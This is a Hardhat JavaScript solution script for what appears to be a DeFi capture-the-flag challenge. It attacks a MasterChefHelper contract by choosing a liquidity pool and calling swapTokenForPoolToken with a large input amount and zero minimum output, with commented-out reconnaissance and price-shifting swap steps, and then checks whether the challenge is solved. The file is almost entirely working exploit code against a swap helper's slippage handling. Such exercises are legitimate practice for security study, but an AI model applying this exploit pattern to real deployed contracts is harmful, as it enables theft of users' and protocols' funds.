const { ethers, network } = require("hardhat")
const { developmentChains } = require("../helper-hardhat-config")

async function solve() {
    const player = (await ethers.getSigners())[0]
    const setup = await ethers.getContractAt("Setup", "0xAeCf3571e50715c968Bf94975f186110c1DA3971", player)

    const mcHelperAddress = await setup.mcHelper()
    const mcHelper = await ethers.getContractAt("MasterChefHelper", mcHelperAddress, player)

    const routerAddress = await mcHelper.router()
    const router = await ethers.getContractAt("UniswapV2RouterLike", routerAddress, player)

    const wethAddress = await setup.weth()
    const weth = await ethers.getContractAt("WETH9", wethAddress, player)
    console.log(`WETH Address=${weth.address}`)

    const mcAddress = await mcHelper.masterchef()
    // const mc = await ethers.getContractAt("MasterChefLike", mcAddress, player)
    const mc = await ethers.getContractAt("MasterChef", mcAddress, player)

    async function checkMCHelperBalance() {
        const mcHelperBalance = await weth.balanceOf(mcHelper.address)
        console.log(`MCHelper WETH Balance=${ethers.utils.formatEther(mcHelperBalance)}`)
    }

    async function checkPlayerBalance() {
        // const playerETH = await ethers.provider.getBalance(player.address)
        // console.log(`My ETH Balance=${ethers.utils.formatEther(playerETH)}`)

        const playerWETHBalance = await weth.balanceOf(player.address)
        console.log(`My WETH Balance=${ethers.utils.formatEther(playerWETHBalance)}`)
    }

    async function checkPoolReserves(poolId, pairAddress) {
        const pair = await ethers.getContractAt("UniswapV2PairLike", pairAddress, player)
        const token0 = await pair.token0()
        const token1 = await pair.token1()
        const token0Contract = await ethers.getContractAt("ERC20Like", token0, player)
        const token1Contract = await ethers.getContractAt("ERC20Like", token1, player)
        const token0Balance = await token0Contract.balanceOf(pairAddress)
        const token1Balance = await token1Contract.balanceOf(pairAddress)
        console.log(`Pool ${poolId} Info:`)
        console.log(`  Token0 Address=${token0}`)
        console.log(`  Token0 Balance=${ethers.utils.formatEther(token0Balance)}`)
        console.log(`  Token1 Address=${token1}`)
        console.log(`  Token1 Balance=${ethers.utils.formatEther(token1Balance)}`)
    }

    await checkPlayerBalance()
    // await checkPoolReserves(21, "0xCEfF51756c56CeFFCA006cD410B03FFC46dd3a58")
    // await checkPoolReserves(25, "0x382c4a5147Fd4090F7BE3A9Ff398F95638F5D39E")
    // await checkPoolReserves(26, "0x2024324a99231509a3715172d4F4f4E751b38d4d")

    // 0) We need to find the right pool ...
    // The target pool must have WETH
    // The input token must have direct path to WETH, any pool is ok
    // The input token must have direct path to the non-WETH token of the target pool

    // for (i = 21; i < 22; i++) {
    //     const poolInfo = await mc.poolInfo(i.toString())
    //     const lpAddress = poolInfo["lpToken"]
    //     console.log(`Pool ${i} - Checking LP=${lpAddress}`)
    //     const pair = await ethers.getContractAt("UniswapV2PairLike", lpAddress, player)
    //     const token0 = await pair.token0()
    //     const token1 = await pair.token1()
    //     console.log(`  Token0=${token0}`)
    //     console.log(`  Token1=${token1}`)
    //     if (token0.toString() == wethAddress.toString()) {
    //         console.log(`   Pool ${i} where token0 is WETH`)
    //     } else if (token1.toString() == wethAddress.toString()) {
    //         console.log(`   Pool ${i} where token1 is WETH`)
    //     } else {
    //         console.log(` !!Yay! Found pool ${i} where WETH is not a token`)
    //     }
    // }

    // 1) Swap my ETH for WETH [Only run once]
    // await weth.deposit({ value: ethers.utils.parseEther("4999.8") })
    // await weth.approve(mcHelper.address, ethers.utils.parseEther("5000"))
    // await weth.approve(router.address, ethers.utils.parseEther("5000"))

    const poolId = "21"

    const gasLimit = 29970705
    const inputTokenAddress = "0x5dbcF33D8c2E976c6b560249878e6F1491Bca25c" // Token INPUT
    const inputTokenContract = await ethers.getContractAt("ERC20Like", inputTokenAddress, player)
    await inputTokenContract.approve(mcHelper.address, ethers.utils.parseEther("5000"))

    const poolToken0Address = "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599" // Token A
    const poolToken0Contract = await ethers.getContractAt("ERC20Like", poolToken0Address, player)
    await poolToken0Contract.approve(mcHelper.address, ethers.utils.parseEther("5000"))
    await poolToken0Contract.approve(router.address, ethers.utils.parseEther("5000"))

    async function checkPlayerInputTokenBalance() {
        const playerInputTokenBalance = await inputTokenContract.balanceOf(player.address)
        console.log(`Player INPUT Balance =${ethers.utils.formatEther(playerInputTokenBalance)}`)
    }

    async function checkPlayerPoolTokenBalance() {
        const playerTokenBalance = await poolToken0Contract.balanceOf(player.address)
        console.log(`Player TokenA Balance=${ethers.utils.formatEther(playerTokenBalance)}`)
    }

    await checkPlayerInputTokenBalance()
    await checkPlayerPoolTokenBalance()

    // Swap WETH for A
    // const amountInWeth = ethers.utils.parseEther("10")
    // const txSwap = await router.swapExactTokensForTokens(amountInWeth, 0, [wethAddress, poolToken0Address], player.address, Date.now() + 600, {
    //     gasLimit: gasLimit,
    // })
    // const txSwapReceipt = await txSwap.wait(1)
    // // console.log(txSwapReceipt)
    // await checkPlayerPoolTokenBalance()

    // // Swap A for INPUT to increase INPUT value
    // const amountInA = await poolToken0Contract.balanceOf(player.address)
    // const txSwapA = await router.swapExactTokensForTokens(amountInA, 0, [poolToken0Address, inputTokenAddress], player.address, Date.now() + 600, {
    //     gasLimit: gasLimit,
    // })
    // const txSwapAReceipt = await txSwapA.wait(1)
    // // console.log(txSwapReceipt)
    // await checkPlayerInputTokenBalance()
    // await checkPoolReserves(26, "0x2024324a99231509a3715172d4F4f4E751b38d4d")

    // 2) Swap from WETH to Input token
    // const amountInWeth = ethers.utils.parseEther("1")
    // const txSwap = await router.swapExactTokensForTokens(amountInWeth, 0, [wethAddress, inputTokenAddress], player.address, Date.now() + 600, {
    //     gasLimit: gasLimit,
    // })
    // const txSwapReceipt = await txSwap.wait(1)
    // // console.log(txSwapReceipt)
    // await checkPlayerInputTokenBalance()

    // 4) Perform the swap in MCHelper
    const amountIn = ethers.utils.parseEther("1100")
    const tx = await mcHelper.swapTokenForPoolToken(poolId, inputTokenAddress, amountIn, 0, { gasLimit: gasLimit })
    const txReceipt = await tx.wait(1)
    console.log(txReceipt)

    await checkPlayerBalance()
    await checkMCHelperBalance()
    const isSolved = await setup.isSolved()
    console.log(`Result=${isSolved}`)
}

solve()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        process.exit(1)
    })
